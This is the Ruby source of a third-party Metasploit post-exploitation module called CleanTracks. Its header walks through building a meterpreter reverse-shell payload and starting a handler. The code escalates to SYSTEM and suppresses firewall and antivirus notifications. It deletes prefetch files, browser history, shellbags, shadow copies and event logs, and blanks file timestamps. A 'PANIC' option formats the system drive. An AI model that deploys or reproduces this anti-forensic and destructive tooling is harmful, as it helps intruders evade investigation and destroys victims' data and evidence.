##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# [ CleanTracks.rb ] Anti-forensic auxiliary module.
# $Id$ 1.9 Author: pedr0 Ubuntu [r00t-3xp10it]
# Hosted By: peterubuntu10[at]sourceforge[dot]net
# http://sourceforge.net/projects/msf-auxiliarys/
# https://sourceforge.net/p/msf-auxiliarys/discussion/general/thread/642cc0f1/?limit=25#182d
#
#
# ---
# As metasploit framework long time user i realized that in actual database does not exist any module
# that covers your tracks efficiently (in a forensic data breach investigation), Looking at the actual
# database we can only find two 'meterpreter' modules that help us in your task: 'clearev' that clear
# the Applications, System and Security logs on a Window system (event viewer) and 'timestomp' to
# manipulate the MACE (Modified, Accessed, Changed) times of files/appl (windows systems timestomp)...
# 
# But from a forensic point of view there are mutch more 'artifacts' left in the system that helps
# forensics to understand what steps we have taken. After a quick reading we can understand that most
# 'artifacts' are found in registry, .lnk files, .tmp, .log, Browser History, Prefetch Files (.pf)
# RecentDocs, ShellBags, Temp/Recent folders and also in restore points, for this reazon i have
# decided to write this post-exploitation anti-forensic auxiliary module.
# ---
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/CleanTracks.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/CleanTracks.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
# [ START METASPLOIT SERVICES ]
# sudo /etc/init.d/postgresql start
# sudo /etc/init.d/metasploit start
# sudo msfdb init
#
# [ BUILD A WINDOWS METERPRETER PAYLOAD TO TEST AUXILIARY ]
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 --platform windows -f exe -o payload.exe
# 'send payload.exe to target using any method of your choise'
#
# [ START A MULTI-HANDLER TO RECIVE CONNECTION ]
# msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.69; set LPORT 666; exploit'
# 'execute payload.exe in target system with admin privs (execute as administrator)'
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/CleanTracks
# msf post(CleanTracks) > info
# msf post(CleanTracks) > show options
# msf post(CleanTracks) > show advanced options
# msf post(CleanTracks) > set [option(s)]
# msf post(CleanTracks) > exploit
##
 
 
 
# -----------------------------------
# Module Dependencies
# -----------------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/accounts'
 
 
 
# -------------------------------------
# Metasploit Class name and libs
# -------------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Registry
         include Msf::Post::Windows::Accounts

 
 
# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'CleanTracks Anti-forensic auxiliary',
                        'Description'   => %q{
                                        This module needs a meterpreter session open to cover,
                                footprints left in target system after a sucessfully exploitation,
                                it rellys on registry keys and cmd commands to achieve that goal.
                                  "Also we can set more than one option to run simultaneously"
                                                                                           
                               GET_SYS: getprivs msf API call to elevate current session to
                                        nt authority/system, its advice to run it before runnig
                                        any of the stages (PREVENT, CLEANER, DEL_LOGS, REVERT)
                               PREVENT: the creation of data in target system (footprints) by
                                        adding registry policie keys into target regedit, this
                                        module should be run just after a sucessfully exploitation.
                               CLEANER: clear temp, prefetch, recent, flushdns, restore points
                                        reg last key accessed, cookies, tmp, pf, shellbags.
                                        This module should be run before leaving session.
                              DEL_LOGS: delete all Event Viewer logfiles in target system
                                REVERT: regedit policies in target system to default values
                                LOGOFF: logoff target machine (optional, more effective)
 
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-exploitation auxiliary module author
                                        'Bug Hunters: Betto,crypt0,chaitanya,spirit', # testing/debug module

                                ],
 
                        'Version'        => '$Revision: 1.9',
                        'DisclosureDate' => 'jul 13 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ],
                                         [ 'URL', 'http://www.fireeye.com/blog/threat-research/2013/08/execute.html' ],
                                         [ 'URL', 'http://www.forensicfocus.com/a-forensic-analysis-of-the-windows-registry' ],
                                         [ 'URL', 'http://pt.slideshare.net/bsmuir/windows-10-forensics-os-evidentiary-artefacts' ],
                                         [ 'URL', 'http://windowsir.blogspot.pt/2013/07/howto-determine-user-access-to-files.html' ],
                                         [ 'URL', 'http://www.magnetforensics.com/computer-forensics/forensic-analysis-of-lnk-files' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                # Opt::RPORT(666), # Example how to register a default setting...
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('GET_SYS', [ false, 'Elevate current session to nt authority/system' , false]),
                                OptBool.new('PREVENT', [ false, 'The creation of data in target system (footprints)' , false]),
                                OptBool.new('CLEANER', [ false, 'Cleans temp/prefetch/recent/flushdns/logs/restorepoints' , false]),
                                OptBool.new('DEL_LOGS', [ false, 'Cleans EventViewer logfiles in target system' , false]),
                                OptBool.new('LOGOFF', [ false, 'Logoff target system (no prompt)' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('REVERT', [ false, 'Revert regedit policies in target to default values' , false]),
                                OptBool.new('PANIC', [ false, 'Use this option as last resource (format NTFS systemdrive)' , false]),
                                OptString.new('DIR_MACE', [ false, 'Blank MACE of any directory inputed (eg: %windir%\\\\system32)']),
                        ], self.class)
 
        end





# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   sys = session.sys.config.sysinfo
   print_error("Operative System: #{sys['OS']}")
   print_error("This auxiliary only works against windows systems!")
   print_line("")
   print_warning("Please execute [info] for further information...")
   raise Rex::Script::Completed
end




# -----------------------------------------
# Getting session nt authority/system privs
# -----------------------------------------
       def ls_getsys
             toor = []
             # variable API declarations
             toor = client.sys.config.getuid
             print_line("")
             print_line("    Session UID: #{toor}")
             print_line("    Elevate session to: nt authority/system")
             print_line("    ------------------------------------------")
             # getprivs API call loop funtion
             client.sys.config.getprivs.each do |priv|
             print_line("    Impersonate token => #{priv}")
       end
 
         # checking results (if_system)
         result = client.priv.getsystem
         if result and result[0]
 
                csuid = []
                csuid = client.sys.config.getuid
                # print results on screen if successefully executed
                print_line("    ------------------------------------------")
                print_line("    Current Session UID: #{csuid}")
                print_line("")

      else
      # error display in executing command
      print_error(" Fail to obtain [nt authority/system] access!")
      print_error(" Please manually run: getsystem to gain system privs!")
      end
 end



# -----------------------------------------------------
# PREVENT - ADD REGISTRY POLICIES KEYS TO TARGET SYSTEM
# -----------------------------------------------------
def ls_stage1
  # list of arrays to be executed
  hacks = [
   'REG ADD "HKLM\\System\\CurrentControlSet\\services\\WSearch" /v start /t REG_DWORD /d 4 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\Update" /v UpdateMode /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Security Center" /v FirewallDisableNotify /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Security Center" /v AntiVirusDisableNotify /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\Software\\Policies\\Microsoft\\Windows\NetCache" /v PurgeAtLogoff /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\FileSystem" /v NtfsDisableLastAccessUpdate /t REG_DWORD /d 1 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Comdlg32" /v NoFileMRU /t REG_DWORD /d 1 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoInstrumentation /t REG_DWORD /d 1 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 1 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v EnableInstallerDetection /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileATShutdown /t REG_SZ /d 1 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\internet Settings\\Url History" /v DaysToKeep /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Cache" /v Persistent  /t REG_DWORD /d 0 /f',
   'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
  ]
 
        r=''
        print_line("")
        # executing list of arrays on target system and display info on screen
        print_line("    Prevent the creation of data in target system by")
        print_line("    adding registry policie keys into target regedit")
        print_line("    ------------------------------------------")
        session.response_timeout=120
        hacks.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_line("    exec => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 # error exception funtion
                 rescue ::Exception => e
                  print_error(" Error Running Command: #{e.class} #{e}")
                  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
                end
        end
        # print display on screen
        print_line("    ------------------------------------------")
        print_line("    Remmenber to run [CLEANER] before exit session")
        print_line("")
end



# ----------------------------------------------
# CLEANER - CLEAR TEMP/RECENTE/PREFETCH/COOKIES
# DELETE RESTORE POINTS / FLUSHDNS / ETC ...
# ----------------------------------------------
    def ls_stage2
      # list of arrays to be executed
      hacks = [
        'ipconfig /flushdns',
        'DEL /q /f /s %temp%\\*.*',
        'DEL /q /f %windir%\\*.tmp',
        'DEL /q /f %windir%\\*.log',
        'DEL /q /f /s %windir%\\Temp\\*.*',
        'DEL /q /f /s %userprofile%\\*.tmp',
        'DEL /q /f /s %userprofile%\\*.log',
        'DEL /q /f %windir%\\system\\*.tmp',
        'DEL /q /f %windir%\\system\\*.log',
        'DEL /q /f %windir%\\System32\\*.tmp',
        'DEL /q /f %windir%\\System32\\*.log',
        'DEL /q /f /s %windir%\\Prefetch\\*.*',
        'vssadmin delete shadows /for=%systemdrive% /all /quiet',
        'DEL /q /f /s %appdata%\\Microsoft\\Windows\\Recent\\*.*',
        'DEL /q /f /s %appdata%\\Mozilla\\Firefox\\Profiles\\*.*',
        'DEL /q /f /s %appdata%\\Microsoft\\Windows\\Cookies\\*.*',
        'DEL /q /f %appdata%\\Google\\Chrome\\"User Data"\\Default\\*.tmp',
        'DEL /q /f %appdata%\\Google\\Chrome\\"User Data"\\Default\\History\\*.*',
        'DEL /q /f %appdata%\\Google\\Chrome\\"User Data"\\Default\\Cookies\\*.*',
        'DEL /q /f %userprofile%\\"Local Settings"\\"Temporary Internet Files"\\*.*',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\ShellNoRoam\\Bags" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\ShellNoRoam\\BagMRU" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist" /f',
        'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComputerDescriptions" /f',
        'REG DELETE "HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache" /f',
        'REG DELETE "HKLM\\System\\CurrentControlSet\\Services\\Netlogon\\Parameters" /v sitename /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\ShellNoRoam\\Bags" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\ShellNoRoam\\BagMRU" /ve /t REG_SZ /f',
        'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\Update" /v UpdateMode /t REG_DWORD /d 1 /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComputerDescriptions" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache" /ve /t REG_SZ /f',
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit" /v LastKey /t REG_SZ /d x0d /f',
        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
     ]
 
        r=''
        print_line("")
        # executing list of arrays on target system and display info on screen
        print_line("    Clear temp, prefetch, recent, flushdns cache")
        print_line("    cookies, shellbags, muicache, restore points")
        print_line("    ------------------------------------------")
        session.response_timeout=120
        hacks.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_line("    Cleaning => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 # error exception funtion
                 rescue ::Exception => e
                  print_error(" Error Running Command: #{e.class} #{e}")
                  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
                end
      end
      # print display on screen
      print_line("    ------------------------------------------")
      print_line("    All footprints deleted from target system!")
      print_line("")
end



# ---------------------------------------------------------------- 
# PANIC - warning this funtion messes up with explorer.exe
# ONLY USE THIS FUNTION AS LAST RESOURCE (IT WILL FORMAT HARDDRIVE)
# ----------------------------------------------------------------
def ls_panic
  # list of arrays to be executed
  panic = [
   'DEL /q /f /s %systemdrive%\\*.log',
   'DEL /q /f /s %systemdrive%\\*.tmp',
   'DEL /q /f /s %systemdrive%\\*.dat', # this key its problematic to explorer.exe
   'DEL /q /f /s %systemdrive%\\*.lnk', # this key its problematic to explorer.exe shortcuts displays
   'vssadmin delete shadows /for=%systemdrive% /all /quiet', # delete restore points in target system
   'format %systemdrive% /fs:NTFS /p:3', # this key will write 0 in all disk 3 times (overwriting all data)
   'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True' # this key will refresh explorer.exe
  ]
 
        r=''
        print_line("")
        # executing list of arrays on target system and display info on screen
        print_line("    Panic_cleanup will delete all lnk|tmp|dat|log")
        print_line("    starting in %systemdrive% directory recursive!")
        print_line("    It also Formats harddrive with null bits (0)")
        print_line("    ------------------------------------------")
        session.response_timeout=120
        panic.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_line("    exec => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 # error exception funtion
                 rescue ::Exception => e
                  print_error(" Error Running Command: #{e.class} #{e}")
                  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
                end
        end
        # print display on screen
        print_line("    ------------------------------------------")
        print_line("    Panic_cleanup successfuly finish!")
        print_line("")
 end



# ------------------------------------------------
# DEL_LOGS -  clear all EVENTLOGS on target system
# ------------------------------------------------
       def ls_clear
         # list of logfiles to delete (eventviewer)
         evtlogs = [
            'security',
            'system',
            'application',
            'directory service',
            'dns server',
            'file replication service'
     ]
 
             begin
               # print display on screen
               print_line("")
               print_line("    Clean EventLogs of: #{sysinfo['Computer']}")
               print_line("    ------------------------------------------")
               # clear IDS eventlogs loop funtion
               evtlogs.each do |evl|
               print_line("    Cleaning => #{evl} EventLog")
                 log = session.sys.eventlog.open(evl)
                 log.clear
             end
             # print display on screen
             print_line("    ------------------------------------------")
             print_line("    All EventLogs in EventViewer have been cleared!")
             print_line("")
       # error exception funtion
       rescue ::Exception => e
       print_error("Error clearing Event Log: #{e.class} #{e}")
       print_error("Try to rise meterpreter session to [nt authority/system] before runing this module")
    end
end



# ------------------------------------------------------ 
# DIR_MACE - CHANGE MACE VALUES OF ANY INPUTED DIRECTORY
# (FILES/APPL) IN TARGET SYSTEM TO BLANK VALUES
# ------------------------------------------------------
        def ls_mace
          # Inputed path in target to blank mace
          file_path = datastore['DIR_MACE']
            if file_path.nil?
               print_line("")
               print_line("    ------------------------------------------")
               print_line("    No Directory Path specified/found...")
               print_line("    example: set DIR_MACE %windir%\\\\System32")
               print_line("    ------------------------------------------")
               print_line("")
               return
            end

                 print_line("")
                 # using metasploit API to blank mace directory recursive
                 print_line("    Blank MACE attributes in inputed directory")
                 print_line("    ------------------------------------------")

            # run_single("timestomp -r #{file_path}")
            client.priv.fs.blank_directory_mace(file_path)
            print_line("    Blank MACE => #{file_path}")
            print_line("    ------------------------------------------")
            print_line("")

        # error exception funtion
        rescue ::Exception => e
        print_error(" Error: #{e.class} #{e}")
        print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
 end



# ---------------------------------------------------- 
# REVERT - REVERT POLICIES (prevent) TO DEFAULT VALUES
# ----------------------------------------------------
def ls_revert
  # list of arrays to be executed
  default = [
   'REG ADD "HKLM\\System\\CurrentControlSet\\services\\WSearch" /v start /t REG_DWORD /d 2 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\Update" /v UpdateMode /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Security Center" /v FirewallDisableNotify /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Security Center" /v AntiVirusDisableNotify /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\Software\\Policies\\Microsoft\\Windows\NetCache" /v PurgeAtLogoff /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\FileSystem" /v NtfsDisableLastAccessUpdate /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Comdlg32" /v NoFileMRU /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoInstrumentation /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 0 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v ClearRecentDocsOnExit /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v EnableInstallerDetection /t REG_DWORD /d 1 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 0 /f',
   'REG ADD "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileATShutdown /t REG_SZ /d 0 /f',
   'REG ADD "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\internet Settings\\Url History" /v DaysToKeep /t REG_DWORD /d 15 /f',
   'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Cache" /v Persistent  /t REG_DWORD /d 1 /f',
   'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
  ]
 
        r=''
        print_line("")
        # executing list of arrays on target system and display info on screen
        print_line("    Reverts all registry policies keys changed")
        print_line("    by (PREVENT) option to there default values!")
        print_line("    ------------------------------------------")
        session.response_timeout=120
        default.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_line("    exec => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 # error exception funtion
                 rescue ::Exception => e
                  print_error(" Error Running Command: #{e.class} #{e}")
                  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
                end
        end
        # print display on screen
        print_line("    ------------------------------------------")
        print_line("    Target system its now logging activity again!")
        print_line("")
 end



# ----------------------- 
# LOGOFF - TARGET MACHINE
# -----------------------
        def ls_logoff
          r=''
          print_line("")
          print_line("    Logoff: #{sysinfo['Computer']} (no prompt)")
          print_line("    ------------------------------------------")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c shutdown /l", nil, {'Hidden' => true, 'Channelized' => true})
 
             # close channel when done
             r.channel.close
             r.close
             print_line("    exec => cmd.exe /c shutdown /l")
             print_line("    ------------------------------------------")
             print_line("    Exploitation ended! have a safe return...")
             print_line("")
        # error exception funtion
        rescue ::Exception => e
        print_error(" Error Running Command: #{e.class} #{e}")
        print_error(" Try to rise meterpreter session to [AUTHORITY/SYSTEM] before runing this module")
 end



# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES)
# Running sellected modules against session target
# ------------------------------------------------
       def run
       session = client
       # Check for proper target Platform
       unsupported if client.platform !~ /win32|win64/i

         # Variable declarations (msf API calls)
         sysnfo = session.sys.config.sysinfo
         runtor = client.sys.config.getuid
         runtime = client.ui.idle_time
         rport = client.session_port
         runsession = client.session_host
         directory = client.fs.dir.pwd
         hpat = client.fs.file.expand_path("%HOMEPATH%")
         syhd = client.fs.file.expand_path("%SYSTEMDRIVE%")
         prOc = client.sys.process.getpid


       # Print banner and scan results on screen
       print_line("    +--------------------------------------------+")
       print_line("    |       * CleanTracks - Anti-forensic *      |")
       print_line("    |    Author: Pedro Ubuntu [ r00t-3xp10it ]   |")
       print_line("    |                    ---                     |")
       print_line("    |  Cover your footprints in target system by |")
       print_line("    |  deleting prefetch, cache, event logs, lnk |")
       print_line("    |  tmp, dat, MRU, shellbangs, recent, etc.   |")
       print_line("    +--------------------------------------------+")
       print_line("")
       print_line("    Running on session  : #{datastore['SESSION']}")
       print_line("    Computer            : #{sysnfo['Computer']}")
       print_line("    Operative System    : #{sysnfo['OS']}")
       print_line("    Target UID          : #{runtor}")
       print_line("    Target IP addr      : #{runsession}")
       print_line("    Target Session Port : #{rport}")
       print_line("    Target idle time    : #{runtime}")
       print_line("    Target Home dir     : #{hpat}")
       print_line("    Target System Drive : #{syhd}")
       print_line("    Target Payload dir  : #{directory}")
       print_line("    Target Payload PID  : #{prOc}")
       print_line("")
       print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['GET_SYS']
         ls_getsys
      end

      if datastore['PREVENT']
         ls_stage1
      end

      if datastore['CLEANER']
         ls_stage2
      end

      if datastore['DIR_MACE']
         ls_mace
      end

      if datastore['REVERT']
         ls_revert
      end

      if datastore['DEL_LOGS']
         ls_clear
      end

      if datastore['PANIC']
         ls_panic
      end
 
      if datastore['LOGOFF']
         ls_logoff
      end
   end
end
